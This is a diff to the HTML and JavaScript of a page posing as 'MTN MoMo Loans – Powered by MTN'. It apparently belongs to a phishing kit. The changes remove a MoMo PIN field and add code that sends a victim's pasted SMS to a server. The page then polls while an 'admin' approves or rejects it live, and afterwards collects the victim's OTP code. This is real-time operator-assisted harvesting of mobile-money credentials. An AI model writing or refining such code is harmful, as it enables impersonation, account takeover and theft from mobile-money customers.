@@ -502,14 +502,15 @@
   <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
     <div class="wait-wrap">
       <div class="wait-icon">⏳</div>
-      <h2>Awaiting Approval</h2>
-      <p>Your SMS message has been received. Please wait for admin approval to proceed with OTP verification.</p>
-      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">You will be redirected automatically once approved…</div>
+      <h2>Verifying SMS Message</h2>
+      <p>Your SMS message has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your message...</div>
     </div>
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 9: OTP ══════════════════════ -->
+<!-- ══════════════════════ PAGE 10: OTP ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-sms-paste')">← Back</button>
@@ -519,27 +520,12 @@
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>Complete Verification</h2>
-      <p class="otp-hint">Enter your 5-digit MoMo PIN and 4-digit OTP to complete verification</p>
+      <h2>Enter OTP Code</h2>
+      <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>
 
-      <!-- PIN Section -->
+      <!-- OTP Section Only -->
       <div class="otp-section">
-        <div class="otp-section-title">Your MoMo PIN (5 digits):</div>
-        <div style="display: flex; align-items: center;">
-          <div class="otp-inputs" id="pinInputs">
-            <input type="password" id="otpPin0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otpPin')">
-            <input type="password" id="otpPin1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otpPin')">
-            <input type="password" id="otpPin2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otpPin')">
-            <input type="password" id="otpPin3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otpPin')">
-            <input type="password" id="otpPin4" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otpPin')">
-          </div>
-          <button class="otp-delete" onclick="clearOtpPin()" title="Delete PIN">✕</button>
-        </div>
-      </div>
-
-      <!-- OTP Section -->
-      <div class="otp-section">
-        <div class="otp-section-title">OTP (4 digits) from MTN MoMo:</div>
+        <div class="otp-section-title">OTP Code (4 digits):</div>
         <div style="display: flex; align-items: center;">
           <div class="otp-inputs" id="otpInputs">
             <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
@@ -564,7 +550,7 @@
   <div class="otp-foot">© 2026 MTN MoMo Loans – Powered by MTN</div>
 </div>
 
-<!-- ══════════════════════ PAGE 10: APPROVAL ══════════════════════ -->
+<!-- ══════════════════════ PAGE 11: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
     <div class="appr-top">
@@ -911,22 +897,76 @@
     document.getElementById('bSms').disabled = true;
 
     try {
-      // For demo, just simulate SMS received and proceed to OTP
-      // In production, this would validate the SMS with the server
-      
-      // Show wait for approval
-      goTo('page-wait-sms');
-      
-      // Simulate admin approval - proceed to OTP after 2 seconds
-      setTimeout(() => {
-        goTo('page-otp');
-      }, 2000);
-      
+      // Submit SMS message to admin for verification
+      const res = await fetch('/api/verify-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          applicationId: S.applicationId,
+          smsMessage: msg
+        })
+      });
+
+      const data = await res.json();
+      document.getElementById('mSms').classList.remove('show');
+
+      if (data.success) {
+        // Show wait for admin approval
+        document.getElementById('waitSmsAppId').textContent = S.applicationId;
+        goTo('page-wait-sms');
+        
+        // Start polling for SMS approval
+        pollForSmsApproval(S.applicationId);
+      } else {
+        document.getElementById('bSms').disabled = false;
+        showSmsMsg('error', data.message || 'Failed to submit SMS.');
+      }
     } catch (err) {
       document.getElementById('mSms').classList.remove('show');
       document.getElementById('bSms').disabled = false;
-      showSmsMsg('error', 'Error processing SMS.');
+      showSmsMsg('error', 'Network error: ' + err.message);
     }
+  }
+
+  // Poll for SMS approval status
+  let smsPollTimeout;
+  function pollForSmsApproval(applicationId) {
+    const checkStatus = async () => {
+      try {
+        const res = await fetch(`/api/check-otp-status/${applicationId}`);
+        const data = await res.json();
+        
+        if (data.success) {
+          const status = data.status;
+          
+          if (status === 'approved') {
+            console.log('✅ Admin approved SMS');
+            clearTimeout(smsPollTimeout);
+            goTo('page-otp');
+          } else if (status === 'rejected') {
+            console.log('❌ Admin rejected SMS - ask user to paste correct message');
+            clearTimeout(smsPollTimeout);
+            goTo('page-sms-paste');
+            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+            // Clear the textarea for user to enter correct message
+            document.getElementById('smsMsgBox').value = '';
+          } else {
+            // Still pending, keep polling
+            smsPollTimeout = setTimeout(checkStatus, 2000);
+          }
+        } else {
+          // Keep polling on error
+          smsPollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        console.error('SMS Poll error:', err);
+        // Keep polling on network error
+        smsPollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    
+    // Start polling
+    checkStatus();
   }
 
   // ══════════════════════════════════════════════════════
@@ -937,18 +977,15 @@
     let id = el.id;
     let idx = parseInt(id.match(/\d$/)[0]);
 
-    if (el.value && type === 'otpPin' && idx < 4) {
-      document.getElementById(type + (idx + 1)).focus();
-    } else if (el.value && type === 'otp' && idx < 3) {
+    if (el.value && type === 'otp' && idx < 3) {
       document.getElementById(type + (idx + 1)).focus();
     }
     chkOtp();
   }
 
   function chkOtp() {
-    const pinOk = [0,1,2,3,4].every(i => document.getElementById('otpPin'+i).value);
     const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
-    document.getElementById('bOtp').className = (pinOk && otpOk) ? 'btn-otp rdy' : 'btn-otp';
+    document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
   }
 
   function showOtpMsg(type, text) {
@@ -960,11 +997,10 @@
   async function doOtp() {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
-    const pin = [0,1,2,3,4].map(i => document.getElementById('otpPin'+i).value).join('');
     const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
 
-    if (pin.length < 5 || otp.length < 4) {
-      showOtpMsg('error', 'Please enter 5-digit PIN and 4-digit OTP.');
+    if (otp.length < 4) {
+      showOtpMsg('error', 'Please enter 4-digit OTP code.');
       return;
     }
 
@@ -977,7 +1013,6 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           applicationId: S.applicationId,
-          pin,
           otp
         })
       });
